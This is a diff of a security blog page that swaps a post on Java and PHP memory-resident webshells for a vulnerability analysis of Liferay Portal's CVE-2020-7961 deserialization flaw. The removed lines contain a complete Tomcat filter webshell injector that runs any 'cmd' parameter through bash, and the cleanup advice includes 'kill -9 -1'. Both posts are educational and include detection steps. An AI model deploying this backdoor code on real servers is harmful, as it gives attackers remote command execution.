@@ -4,9 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="内存马学习(一), jokerscar&#39;blogs">
-    <meta name="description" content="前言此次学习仅为内存马的初步认识，尤其是java内存马还需更深入研究
-内存马概述Webshell是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客">
+    <meta name="keywords" content="Liferay Portal反序列化, jokerscar&#39;blogs">
+    <meta name="description" content="漏洞概述Liferay（又称Liferay Portal）是一个开源门户项目，该项目包含了一个完整的J2EE应用。该项目使用了Web、EJB以及JMS等技术，特别是其前台界面部分使用Struts 框架技术，基于XML的portlet配置文件">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>内存马学习(一) | jokerscar&#39;blogs</title>
+    <title>Liferay Portal反序列化 | jokerscar&#39;blogs</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -288,12 +287,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">内存马学习(一)</h1>
+                    <h1 class="description center-align post-title">Liferay Portal反序列化</h1>
                 </div>
             </div>
         </div>
@@ -409,16 +408,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/webshell/">
-                                <span class="chip bg-color">webshell</span>
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                <span class="chip bg-color">漏洞分析</span>
                             </a>
                         
-                            <a href="/tags/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/">
-                                <span class="chip bg-color">远控木马</span>
+                            <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                <span class="chip bg-color">Java代码审计</span>
                             </a>
                         
-                            <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
-                                <span class="chip bg-color">内存马</span>
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                                <span class="chip bg-color">反序列化漏洞</span>
                             </a>
                         
                     </div>
@@ -429,12 +428,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-category">
-                                内存马
-                            </a>
-                        
-                            <a href="/categories/%E5%86%85%E5%AD%98%E9%A9%AC/webshell/" class="post-category">
-                                webshell
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category">
+                                漏洞分析
                             </a>
                         
                     </div>
@@ -446,7 +441,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-11-06
+                    2022-03-12
                 </div>
                 
 
@@ -467,112 +462,110 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>此次学习仅为内存马的初步认识，尤其是java内存马还需更深入研究</p>
-<h2 id="内存马概述"><a href="#内存马概述" class="headerlink" title="内存马概述"></a>内存马概述</h2><p>Webshell是黑客经常使用的一种恶意脚本，其目的是获得服务器的执行操作权限，比如执行系统命令、窃取用户数据、删除web页面、修改主页等，其危害不言而喻。黑客通常利用常见的漏洞，如SQL注入、远程文件包含(RFI)、FTP，甚至使用跨站点脚本攻击(XSS)等方式作为社会工程攻击的一部分，最终达到控制网站服务器的目的。</p>
-<p>常见的webshell有php、asp、aspx、jsp、jspx等。而无文件webshell，在早期的攻防演练中可以有效的躲避传统安全软件和设备的检查，主要以在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马。</p>
-<h2 id="PHP不死马"><a href="#PHP不死马" class="headerlink" title="PHP不死马"></a>PHP不死马</h2><h3 id="PHP内存马简述"><a href="#PHP内存马简述" class="headerlink" title="PHP内存马简述"></a>PHP内存马简述</h3><p>PHP内存马也叫不死马，其主要原理是删除自身然后以进程的形式循环创建隐蔽的webshell，在AWD的比赛中用的较为广泛。以一个网上广为流传的版本为例分析。</p>
-<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="/2021/11/06/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20220312230321878.png" alt="image-20220312230321878"></p>
-<p>其中ignore_user_abort（true）函数设置与客户机断开也会继续执行脚本，set_time_limit(0)使时间不受限制，通过unlink(<strong>FILE</strong>)函数删除自身文件，然后从第五行代码开始定义webshell并在后面无限循环生成其中usleep(5000)函数用来定义间隔时间。</p>
-<h3 id="查杀方法"><a href="#查杀方法" class="headerlink" title="查杀方法"></a>查杀方法</h3><p>1、不死马是加载在内存中的攻击方式，因此如果条件允许的话重启服务器是最有效快捷的解决方法。</p>
-<p>2、Kill -9 -1 命令可以杀死当前用户权限下服务器上所有的进程</p>
-<p>3、写一个ignore_user_abort(true)函数的PHP脚本，并写入删除不死马文件，其中usleep()的时间必须要小于不死马的usleep()时间才会有效果。</p>
-<?php
-
-while (1) {
-
-$pid = 不死马PID;
-
-@unlink(".ski12.php");
-
-exec("kill -9 $pid");
-
-usleep(1000);
-
-}
-
-?>
-
-<h2 id="JAVA-内存攻击"><a href="#JAVA-内存攻击" class="headerlink" title="JAVA 内存攻击"></a>JAVA 内存攻击</h2><p>与PHP内存马实现有所不同，java类型的内存马简要原理是内存马的原理就是在web组件或者应用程序中，注册一层访问路由，访问者通过这层路由，来执行我们控制器中的代码。</p>
-<h3 id="JAVA内存马类型"><a href="#JAVA内存马类型" class="headerlink" title="JAVA内存马类型"></a>JAVA内存马类型</h3><p>主流的内存马攻击可分为以下两个大类</p>
-<p>1、Agent型：利用instrument机制，在不增加新类和新方法的情况下，对现有类的执行逻辑进行修改。JVM层注入，通用性强。</p>
-<p>2、非Agent型：通过新增一些Java web组件（如Servlet、Filter、Listener、Controller等）来实现拦截请求，从而注入木马代码，对目标容器环境有较强的依赖性，通用性较弱。</p>
-<h3 id="Tomcat-filter内存马的实现"><a href="#Tomcat-filter内存马的实现" class="headerlink" title="Tomcat filter内存马的实现"></a>Tomcat filter内存马的实现</h3><p>Filter即过滤器，其作用是对web资源进行过滤拦截，在处理后交给下一个过滤器或者servlet处理。Filter的生命周期会经历初始化(init)、拦截（dofilter）、销毁（destroy）的过程。</p>
-<p>根据filter的特性我们使用网上流传的的jsp文件加载内存马</p>
-<p>&lt;%@ page import&#x3D;”org.apache.catalina.core.ApplicationContext” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”java.lang.reflect.Field” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”org.apache.catalina.core.StandardContext” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”java.util.Map” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”java.io.IOException” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”org.apache.tomcat.util.descriptor.web.FilterDef” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”org.apache.tomcat.util.descriptor.web.FilterMap” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”java.lang.reflect.Constructor” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”org.apache.catalina.core.ApplicationFilterConfig” %&gt;</p>
-<p>&lt;%@ page import&#x3D;”org.apache.catalina.Context” %&gt;</p>
-<p>&lt;%@ page language&#x3D;”java” contentType&#x3D;”text&#x2F;html; charset&#x3D;UTF-8” pageEncoding&#x3D;”UTF-8”%&gt;</p>
-<p>&lt;%</p>
-<p>final String name &#x3D; “fengxuan”;</p>
-<p>ServletContext servletContext &#x3D; request.getSession().getServletContext();</p>
-<p>Field appctx &#x3D; servletContext.getClass().getDeclaredField(“context”);</p>
-<p>appctx.setAccessible(true);</p>
-<p>ApplicationContext applicationContext &#x3D; (ApplicationContext) appctx.get(servletContext);</p>
-<p>Field stdctx &#x3D; applicationContext.getClass().getDeclaredField(“context”);</p>
-<p>stdctx.setAccessible(true);</p>
-<p>StandardContext standardContext &#x3D; (StandardContext) stdctx.get(applicationContext);</p>
-<p>Field Configs &#x3D; standardContext.getClass().getDeclaredField(“filterConfigs”);</p>
-<p>Configs.setAccessible(true);</p>
-<p>Map filterConfigs &#x3D; (Map) Configs.get(standardContext);</p>
-<p>if (filterConfigs.get(name) &#x3D;&#x3D; null){</p>
-<p>Filter filter &#x3D; new Filter() {</p>
-<p>@Override</p>
-<p>public void init(FilterConfig filterConfig) throws ServletException {</p>
+                <h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Liferay（又称Liferay Portal）是一个开源门户项目，该项目包含了一个完整的J2EE应用。该项目使用了Web、EJB以及JMS等技术，特别是其前台界面部分使用Struts 框架技术，基于XML的portlet配置文件可以自由地动态扩展，使用了Web Services来支持一些远程信息的获取，使用 Apache Lucene实现全文检索功能。</p>
+<p>7.2.1 CE GA2 之前的 Liferay Portal 中不可信数据的反序列化允许远程攻击者通过 JSON Web 服务 (JSONWS) 执行任意代码。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><em><strong>环境搭建</strong></em></p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1">tomcat集成包</a>，在liferay-ce-portal-7.2.0-ga1\tomcat-9.0.17\bin路径下打开startup.bat，等待tomcat服务开启。</p>
+<p>访问<a href="http://127.0.0.1:8080能正常访问下图页面则说明搭建成功。">http://127.0.0.1:8080能正常访问下图页面则说明搭建成功。</a></p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBD8.tmp.jpg" alt="img"></p>
+<p>跟随网页提示完成初始化后进入以下页面，漏洞环境搭建完成</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBE9.tmp.jpg" alt="img"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造恶意代码</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEA.tmp.jpg" alt="img"></p>
+<p>将其编译为class文件后开启http服务</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEB.tmp.jpg" alt="img"></p>
+<p>使用Java反序列化利用工具<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a>的c3p0模块生成payload</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEC.tmp.jpg" alt="img"></p>
+<p>将构造完成的payload放入请求数据包中</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBED.tmp.jpg" alt="img"></p>
+<p>可以看到成功执行弹出计算器的命令</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEE.tmp.jpg" alt="img"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从nvd官网对CVE-2020-7961的描述中发现反序列化的数据是经过了JSON web service的</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBEF.tmp.jpg" alt="img"></p>
+<p>定位到WEB-INF&#x2F;web.xml中</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBF0.tmp.jpg" alt="img"></p>
+<p>通过该映射规则的servlet找到其对应的类为com.liferay.portal.jsonwebservice.JSONWebServiceServlet</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBF1.tmp.jpg" alt="img"></p>
+<p>跟进这个servlet类，其中的service方法中定义了查看json web服务的路径</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBBF2.tmp.jpg" alt="img"></p>
+<p>在web页面中输入路径<a target="_blank" rel="noopener" href="http://url/api/jsonws%E5%8F%AF%E6%9F%A5%E7%9C%8Bapi%E5%88%97%E8%A1%A8%E3%80%82">http://url/api/jsonws可查看api列表。</a></p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC02.tmp.jpg" alt="img"></p>
+<p>在这些接口有多个接口参数接收java.lang.object，比如update-column，意味着在此处传递的参数可以构造符合Java Beans的可利用恶意类</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC03.tmp.jpg" alt="img"></p>
+<p>liferay在7以前的版本使用flexjson处理、序列化json数据而在7以后使用jodd json处理、序列化json数据，这里主要分析liferay7之后的版本。</p>
+<p>通过查阅资料得知liferay中的com.liferay.portal.json.JSONSerializerImpl实现了jodd中的json序列化的接口JSONSerializer</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC04.tmp.jpg" alt="img"></p>
+<p>在com.liferay.portal.json.JSONDeserializerImpl中实现了了jodd中的反序列化接口JSONDeserializer</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC05.tmp.jpg" alt="img"></p>
+<p>通过漏洞发现者whitecode团队给出jodd.json.Parser的调用图，我们可以在JSONWebServiceServlet下断点后发送&#x2F;api&#x2F;jsonws&#x2F;invoke请求</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC06.tmp.jpg" alt="img"></p>
+<p>一直debug到JSONWebServiceSerlet的父类JSONservlet中发现调用execute处理json继续跟入此方法</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC07.tmp.jpg" alt="img"></p>
+<p>观察com.liferay.portal.struts.JSONAction的execute方法，首先调用rerouteExecte检测路径，调用checkAuthToken方法鉴权，接着调用getJSON再对json数据处理，跟进getJSON</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC08.tmp.jpg" alt="img"></p>
+<p>在没有上传异常通过后进入getJSONWebServiceAction</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC09.tmp.jpg" alt="img"></p>
+<p>在JSONWebServiceAction中继续更热返回的JSONWebServiceInvokerAction类的invoke方法</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC0A.tmp.jpg" alt="img"></p>
+<p>在invoke方法的第一行中发现这里反序列化了_command，__command参数是用来传入调用的api方法</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC0B.tmp.jpg" alt="img"></p>
+<p>继续往下调用了_parseStatement，__executeStatement</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1C.tmp.jpg" alt="img"></p>
+<p>跟入_executeStatement观察result的成分继续深入jsonWebServiceAction</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1D.tmp.jpg" alt="img"></p>
+<p>从下面代码发现getJSONWebServiceAction()最后返回的是一个JSONWebServiceActionImpl实例</p>
+<p>public JSONWebServiceAction getJSONWebServiceAction(</p>
+<p>HttpServletRequest httpServletRequest)</p>
+<p>throws NoSuchJSONWebServiceException {</p>
+<p>String path &#x3D; GetterUtil.getString(httpServletRequest.getPathInfo());</p>
+<p>String method &#x3D; GetterUtil.getString(httpServletRequest.getMethod());</p>
+<p>String parameterPath &#x3D; null;</p>
+<p>JSONRPCRequest jsonRPCRequest &#x3D; null;</p>
+<p>int parameterPathIndex &#x3D; _getParameterPathIndex(path);</p>
+<p>if (parameterPathIndex !&#x3D; -1) {</p>
+<p>parameterPath &#x3D; path.substring(parameterPathIndex);</p>
+<p>path &#x3D; path.substring(0, parameterPathIndex);</p>
 <p>}</p>
-<p>@Override</p>
-<p>public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {</p>
-<p>&#x2F;&#x2F;这里写上我们后门的主要代码</p>
-<p>HttpServletRequest req &#x3D; (HttpServletRequest) servletRequest;</p>
-<p>if (req.getParameter(“cmd”) !&#x3D; null){</p>
-<p>byte[] bytes &#x3D; new byte[1024];</p>
-<p>Process process &#x3D; new ProcessBuilder(“bash”,”-c”,req.getParameter(“cmd”)).start();</p>
-<p>int len &#x3D; process.getInputStream().read(bytes);</p>
-<p>servletResponse.getWriter().write(new String(bytes,0,len));</p>
-<p>process.destroy();</p>
-<p>return;</p>
+<p>else {</p>
+<p>if (method.equals(HttpMethods.POST) &amp;&amp;</p>
+<p>!PortalUtil.isMultipartRequest(httpServletRequest)) {</p>
+<p>jsonRPCRequest &#x3D; JSONRPCRequest.detectJSONRPCRequest(</p>
+<p>httpServletRequest);</p>
+<p>if (jsonRPCRequest !&#x3D; null) {</p>
+<p>path +&#x3D; StringPool.SLASH + jsonRPCRequest.getMethod();</p>
+<p>method &#x3D; null;</p>
 <p>}</p>
-<p>&#x2F;&#x2F;别忘记带这个，不然的话其他的过滤器可能无法使用</p>
-<p>filterChain.doFilter(servletRequest,servletResponse);</p>
 <p>}</p>
-<p>@Override</p>
-<p>public void destroy() {</p>
 <p>}</p>
-<p>};</p>
-<p>FilterDef filterDef &#x3D; new FilterDef();</p>
-<p>filterDef.setFilter(filter);</p>
-<p>filterDef.setFilterName(name);</p>
-<p>filterDef.setFilterClass(filter.getClass().getName()); </p>
-<p>&#x2F;&#x2F; 将filterDef添加到filterDefs中</p>
-<p>standardContext.addFilterDef(filterDef);</p>
-<p>FilterMap filterMap &#x3D; new FilterMap();</p>
-<p>&#x2F;&#x2F;拦截的路由规则，&#x2F;* 表示拦截任意路由</p>
-<p>filterMap.addURLPattern(“&#x2F;*”);</p>
-<p>filterMap.setFilterName(name);</p>
-<p>filterMap.setDispatcher(DispatcherType.REQUEST.name());</p>
-<p>standardContext.addFilterMapBefore(filterMap);</p>
-<p>Constructor constructor &#x3D; ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</p>
-<p>constructor.setAccessible(true);</p>
-<p>ApplicationFilterConfig filterConfig &#x3D; (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</p>
-<p>filterConfigs.put(name,filterConfig);</p>
-<p>out.print(“注入成功”);</p>
+<p>JSONWebServiceActionParameters jsonWebServiceActionParameters &#x3D;</p>
+<p>new JSONWebServiceActionParameters();</p>
+<p>jsonWebServiceActionParameters.collectAll(</p>
+<p>httpServletRequest, parameterPath, jsonRPCRequest, null);</p>
+<p>if (jsonWebServiceActionParameters.getServiceContext() !&#x3D; null) {</p>
+<p>ServiceContextThreadLocal.pushServiceContext(</p>
+<p>jsonWebServiceActionParameters.getServiceContext());</p>
 <p>}</p>
-<p>%&gt;</p>
-<p><img src="/2021/11/06/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/wps4D8D.tmp.jpg" alt="img"></p>
-<p>观察可访问任何servlet路由均可实现命令执行</p>
-<p><img src="/2021/11/06/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/wps4D8E.tmp.jpg" alt="img"></p>
-<h2 id="查杀方法-1"><a href="#查杀方法-1" class="headerlink" title="查杀方法"></a>查杀方法</h2><p>因为内存马是加载在内存中无文件的webshell，因此无法直接通过扫描静态文件的方式扫出内存马，当我们发现内存马的存在的时候可能是攻击者造成了实际的危害。因此排查内存的思路大部分都是建立在通过痕迹来排查。</p>
-<p>1、排查可疑的jsp访问记录</p>
-<p>2、如果是代码执行漏洞，排查中间件的error.log，查看是否有可疑的报错，判断注入时间和方法</p>
-<p>3、根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。</p>
-<p>4、如果是servlet或者spring的controller类型，根据上报的webshell的url查找日志（日志可能被关闭，不一定有），根据url最早访问时间确定被注入时间。</p>
-<p>5、如果是filter或者listener类型，可能会有较多的404但是带有参数的请求，或者大量请求不同url但带有相同的参数，或者页面并不存在但返回200</p>
+<p>JSONWebServiceActionConfig jsonWebServiceActionConfig &#x3D;</p>
+<p>_findJSONWebServiceAction(</p>
+<p>httpServletRequest, path, method,</p>
+<p>jsonWebServiceActionParameters);</p>
+<p>return new JSONWebServiceActionImpl(</p>
+<p>jsonWebServiceActionConfig, jsonWebServiceActionParameters,</p>
+<p>_jsonWebServiceNaming);</p>
+<p>}</p>
+<p>跟入JSONWebServiceActionImpl观察_prepareParameters方法，通过反射获取所有参数，for遍历拿到参数名并处理参数值，当参数值不为空时，会进行类型转换。</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1E.tmp.jpg" alt="img"></p>
+<p>继续往后跟进跟进参数调用_convertValueToParameterValue方法</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC1F.tmp.jpg" alt="img"></p>
+<p>其中折叠的部分包含了将json反序列化传入的参数值，赋值给parameterValue的过程，并判断不是map实例并且是以{开头就反序列化JSONFactoryUtil.looseDeserialize(valueString, parameterType)，如果<strong>parameterType</strong>可控，那么就会造成反序列化漏洞</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC20.tmp.jpg" alt="img"></p>
+<p>上述的_jsonWebServiceActionParameters在其定义的过程中存入了一个JSONWebServiceActionParametersMap</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC21.tmp.jpg" alt="img"></p>
+<p>跟入JSONWebServiceActionParametersMap其中的putty方法在whitecode的文章中描述的很清晰，参数的类型取自key传进来的字符串，如果请求参数名称包含 ‘ <code>:</code>‘，传递进来的值会被构造为”:”前是key,”:”后是typename的hashmap。</p>
+<p><img src="/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/wpsBC22.tmp.jpg" alt="img"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="#toc-9">https://xz.aliyun.com/t/7499#toc-9</a></p>
+<p><a target="_blank" rel="noopener" href="https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html">https://codewhitesec.blogspot.com/2020/03/liferay-portal-json-vulns.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1162/">https://paper.seebug.org/1162/</a></p>
 
                 
             </div>
@@ -599,7 +592,7 @@ usleep(1000);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/11/06/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/">http://example.com/2021/11/06/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0-%E4%B8%80/</a>
+                    <a href="http://example.com/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">http://example.com/2022/03/12/Liferay-Portal%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -637,16 +630,16 @@ usleep(1000);
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/webshell/">
-                                    <span class="chip bg-color">webshell</span>
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+                                    <span class="chip bg-color">漏洞分析</span>
                                 </a>
                             
-                                <a href="/tags/%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/">
-                                    <span class="chip bg-color">远控木马</span>
+                                <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+                                    <span class="chip bg-color">Java代码审计</span>
                                 </a>
                             
-                                <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
-                                    <span class="chip bg-color">内存马</span>
+                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                                    <span class="chip bg-color">反序列化漏洞</span>
                                 </a>
                             
                         </div>
@@ -698,13 +691,13 @@ usleep(1000);
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/11/15/DPAPI-leaning/">
+                <a href="/2022/03/12/fastjson%E6%BC%8F%E6%B4%9E-JdbcRowSetImpl%E9%93%BE/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="DPAPI(leaning)">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="fastjson漏洞-JdbcRowSetImpl链">
                         
-                        <span class="card-title">DPAPI(leaning)</span>
+                        <span class="card-title">fastjson漏洞-JdbcRowSetImpl链</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -715,69 +708,8 @@ usleep(1000);
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-11-15
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
-                                    内网渗透
-                                </a>
-                            
-                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Windows-API/" class="post-category">
-                                    Windows API
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/Windows-api/">
-                        <span class="chip bg-color">Windows api</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/">
-                        <span class="chip bg-color">密码获取</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
-                        <span class="chip bg-color">内网渗透</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/10/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc1%E9%93%BE/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Java反序列化-cc1链">
-                        
-                        <span class="card-title">Java反序列化-cc1链</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-15
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -803,6 +735,67 @@ usleep(1000);
                     
                     <a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
                         <span class="chip bg-color">Java代码审计</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">反序列化漏洞</span>
+                    </a>
+                    
+                    <a href="/tags/JNDI%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">JNDI注入</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/12/Ghostcat-Tomcat/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="Ghostcat Tomcat">
+                        
+                        <span class="card-title">Ghostcat Tomcat</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-12
+                            </span>
